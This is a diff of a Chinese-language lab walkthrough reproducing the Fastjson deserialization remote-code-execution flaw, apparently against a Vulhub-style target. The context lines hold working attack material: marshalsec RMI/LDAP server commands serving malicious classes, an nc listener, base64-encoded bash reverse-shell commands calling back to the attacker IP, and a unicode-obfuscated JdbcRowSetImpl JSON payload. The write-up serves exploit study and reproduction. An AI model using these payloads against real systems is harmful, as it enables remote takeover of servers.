@@ -17,7 +17,9 @@ Fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的
 - [https://www.anquanke.com/post/id/181874](https://www.anquanke.com/post/id/181874)
 # 0x03 环境搭建
 kali：192.168.210.156
+
 靶机：192.168.210.206
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1644997917043-1e9bc0b8-3b10-4ad2-b857-48e99885a3bd.png#clientId=u3b476d97-623c-4&from=paste&height=154&id=u96009385&margin=%5Bobject%20Object%5D&name=image.png&originHeight=205&originWidth=455&originalType=binary&ratio=1&size=20961&status=done&style=none&taskId=ue6c9b5b0-9c1f-4f14-b855-abe391e82ae&width=341)
 # 0x04 漏洞复现
 目标环境是`openjdk:8u102`，这个版本没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，我们可以简单利用RMI进行命令执行。
@@ -50,6 +52,7 @@ public class TouchFile {
 
 使用python开启站点：
 `python3 -m http.server 8888`
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645004606629-60b0f1ec-6f57-44d3-8215-8a79e23d4952.png#clientId=u1557c07f-9e0b-4&from=paste&id=u76616c16&margin=%5Bobject%20Object%5D&name=image.png&originHeight=113&originWidth=628&originalType=binary&ratio=1&size=47632&status=done&style=none&taskId=u3d093954-923a-4c4b-854c-dfa462628e1)
 
 
@@ -79,6 +82,7 @@ source /etc/profile
 进入环境后查看mvn版本，出现以下界面则maven成功安装。
 
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637770914815-e0f0101e-a18c-4bd6-a7a6-7c219b7f10e6.png#clientId=u3ffa8ee0-3db9-4&from=paste&height=117&id=ubf586b7f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=117&originWidth=554&originalType=binary&ratio=1&size=69274&status=done&style=none&taskId=u8ca34e23-f453-4bff-b3e2-2b47ce2ade0&width=554)
 
 
@@ -96,6 +100,7 @@ mvn clean package -DskipTests
 ​
 
 当查看到绿色的SUCCESS时，即可成功编译好marshalsec的jar包：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645005362619-34ac88e4-f688-4f2f-a025-f07fade037fe.png#clientId=u187b60f6-3740-4&from=paste&height=122&id=uc80b08d9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=994&originalType=binary&ratio=1&size=86125&status=done&style=none&taskId=u1f9eabfb-67bf-477f-bf58-5bbf5f67b4d&width=746)
 
 
@@ -107,7 +112,9 @@ mvn clean package -DskipTests
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.210.156:8888/#TouchFile" 9999
 
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645005611688-25fd1914-d80a-407f-ab7e-26d0d9faffd3.png#clientId=ub399f6d8-8991-4&from=paste&id=myE7h&margin=%5Bobject%20Object%5D&name=image.png&originHeight=89&originWidth=1248&originalType=binary&ratio=1&size=24548&status=done&style=none&taskId=u97f0888b-2376-4ae5-a685-77e3e814bf6)
+
 #### 
 #### 3）burp传恶意json数据
 重新访问页面，抓包修改请求为POST，上传恶意json文件。
@@ -125,8 +132,11 @@ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "
     }
 }
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010118882-d0f2bc28-5f41-4c9b-8d70-7e0a8a7935ae.png#clientId=ue85efe70-9394-4&from=paste&id=u26ede270&margin=%5Bobject%20Object%5D&name=image.png&originHeight=573&originWidth=1533&originalType=binary&ratio=1&size=102697&status=done&style=none&taskId=u9a5c1ade-db87-441c-a717-1c9d2fa06da)
+
 进入靶机查看结果：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645009985863-ae654a96-2b22-4637-9466-e566ebdcefc3.png#clientId=ud2d22a83-8a5f-4&from=paste&id=u4903bb8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=44&originWidth=273&originalType=binary&ratio=1&size=6620&status=done&style=none&taskId=u3fcb7d69-0897-476c-ac2d-7f0b6083504)
 
 
@@ -157,6 +167,7 @@ public class ReverseShell {
 }
 
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010750993-675e544d-5dad-4731-bab1-5148db18d3d8.png#clientId=u7cd9ae79-4115-4&from=paste&id=ub2f0d580&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=809&originalType=binary&ratio=1&size=42494&status=done&style=none&taskId=ua98d309d-8b21-4e32-90b5-b59f7600fd8)
 
 
@@ -167,8 +178,11 @@ public class ReverseShell {
 #### 2）python3开启http服务
 ReverseShell.class文件所在处开启http服务
 `python3 -m http.server 8888`
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010342714-e663670c-4296-4203-992e-493f14bc6cd9.png#clientId=u7cd9ae79-4115-4&from=paste&id=uf7084c92&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=1096&originalType=binary&ratio=1&size=29265&status=done&style=none&taskId=ud236eff3-9a18-4844-82c2-a285f3eeecf)
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010419592-94fb8d4c-6556-47a1-b694-d5d4d4e33cd3.png#clientId=u7cd9ae79-4115-4&from=paste&id=u51a954c4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=99&originWidth=822&originalType=binary&ratio=1&size=26306&status=done&style=none&taskId=u730016ca-c61e-4d72-8b53-a32332b374a)
+
 #### 3）kali开启监听
 `nc -lvvp 4444`
 ​
@@ -178,6 +192,7 @@ marshalsec使用RMI利用模块：
 ```bash
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://攻击方ip:8888/#ReverseShell" 9999
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010452252-9502dc9d-9b1b-4e7e-80d7-29454688dbba.png#clientId=u7cd9ae79-4115-4&from=paste&id=uec79cbda&margin=%5Bobject%20Object%5D&name=image.png&originHeight=84&originWidth=1320&originalType=binary&ratio=1&size=27866&status=done&style=none&taskId=u07f15051-9834-4af3-a097-b5345415c1d)
 
 
@@ -212,6 +227,7 @@ Content-Length: 270
 
 
 #### 6）kali收到shell
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010550161-56df26a1-ffc2-42cb-8cc4-6491ad6cd557.png#clientId=u7cd9ae79-4115-4&from=paste&id=ueca5fb4f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=772&originalType=binary&ratio=1&size=71263&status=done&style=none&taskId=u9f394fee-98ec-4d8a-8868-228704c1e67)
 
 
@@ -221,14 +237,17 @@ Content-Length: 270
 ```shell
 java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.210.156 9988 "bash -c {echo,cGluZyA0b296aGcuZG5zbG9nLmNu}|{base64,-d}|{bash,-i}"
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078705760-37933c98-454b-4d54-ade2-818579b3aab9.png#clientId=u99fb2d32-3b09-4&from=paste&id=u020f9195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=112&originWidth=1640&originalType=binary&ratio=1&size=46512&status=done&style=none&taskId=u397b883b-b71a-418b-bb96-9605708c192)
 ​
 
 2）使用burp发送恶意json数据（POST数据包）
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078755953-31aacbb4-774f-41d0-b239-831abd2f637e.png#clientId=u99fb2d32-3b09-4&from=paste&height=349&id=u5d7ebfba&margin=%5Bobject%20Object%5D&name=image.png&originHeight=466&originWidth=1123&originalType=binary&ratio=1&size=72100&status=done&style=none&taskId=ub3cd460c-78db-4ccd-9cdc-2345f47ecdb&width=842)
 ​
 
 3）LDAP服务有连接记录：
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078612079-35d480ea-7342-4c32-97db-cead2c4d73b1.png#clientId=u99fb2d32-3b09-4&from=paste&id=u73e7d5e8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=217&originWidth=1625&originalType=binary&ratio=1&size=83087&status=done&style=none&taskId=ub962a262-4e5a-4a24-8238-30be217860c)
 ​
 
@@ -236,23 +255,29 @@ java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.210.156 9988 "bash -c {ec
 
 
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645903983799-c83a9cf0-a04c-4d6a-b805-84c258121769.png#clientId=u5df42e45-922d-4&from=paste&height=164&id=u315ef210&margin=%5Bobject%20Object%5D&name=image.png&originHeight=327&originWidth=741&originalType=binary&ratio=1&size=59874&status=done&style=none&taskId=u6f7e6268-5acc-4ce7-a22f-3154615af29&width=371)
+
 ### 2、反弹shell
 1）开启一个LDAP服务，命令用base64编码，Fastjson1.2.47使用第二个payload
 ```shell
 java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.210.156 9988 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMC4xNTYvMTExMSAwPiYx}|{base64,-d}|{bash,-i}"
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645067790992-e66be258-611f-4493-9423-9802b2575d3d.png#clientId=u911901bf-4e8c-4&from=paste&id=ud2aab007&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=1637&originalType=binary&ratio=1&size=55765&status=done&style=none&taskId=ucd1cb4fe-e663-4243-96f5-d7dc0ea7782)
 
 
 2）使用burp发送恶意json数据（POST数据包），LDAP服务有连接记录
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078327238-b6e7d74a-5620-4b26-8610-9c56d3f2258a.png#clientId=u99fb2d32-3b09-4&from=paste&id=u479f58b3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=232&originWidth=1646&originalType=binary&ratio=1&size=89903&status=done&style=none&taskId=u758b4c97-dc16-44b0-8275-e623709457e)
 ​
 
 3）成功反弹
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078936843-2e8a2b44-3a05-4eb7-9cc9-315256311c69.png#clientId=u99fb2d32-3b09-4&from=paste&height=130&id=uab19dcfd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=173&originWidth=618&originalType=binary&ratio=1&size=33396&status=done&style=none&taskId=u4a2a8c5a-9257-4f50-9d6f-e5662c4fde9&width=464)
+
 ## 
 ## 4.4 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
 1、使用burp插件检测Fastjson时，要抓取数据包修改POST，再加上json格式数据，然后`Forword`即可检测。
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645904083428-168d8a48-2218-4fbe-9ddb-ccc973c0166a.png#clientId=u5df42e45-922d-4&from=paste&height=764&id=u3b9eff58&margin=%5Bobject%20Object%5D&name=image.png&originHeight=764&originWidth=1349&originalType=binary&ratio=1&size=121987&status=done&style=none&taskId=u9362116c-36f4-4da6-b8cd-09a28c42960&width=1349)
 
 
@@ -279,6 +304,7 @@ Content-Length: 692
 
 {"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://192.168.210.156:1389/cqydk3","autoCommit":true}}
 ```
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645070245258-4a4ec40f-bacd-48c8-adb6-50327e4453e1.png#clientId=u99fb2d32-3b09-4&from=paste&id=u5c10ce99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=517&originWidth=1008&originalType=binary&ratio=1&size=61348&status=done&style=none&taskId=u77a1e4ef-c8df-4d3c-bb2c-7e3ac5c8eb2)
 
 
@@ -286,4 +312,5 @@ Content-Length: 692
 ​
 
 5、成功反弹shell
+
 ![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645070564105-be5753dc-d2c9-4d87-87a2-a43286ca8822.png#clientId=u99fb2d32-3b09-4&from=paste&id=uaa1072cb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=164&originWidth=611&originalType=binary&ratio=1&size=28204&status=done&style=none&taskId=u70787ba2-21b9-44cb-b726-03c3b7a9f9d)
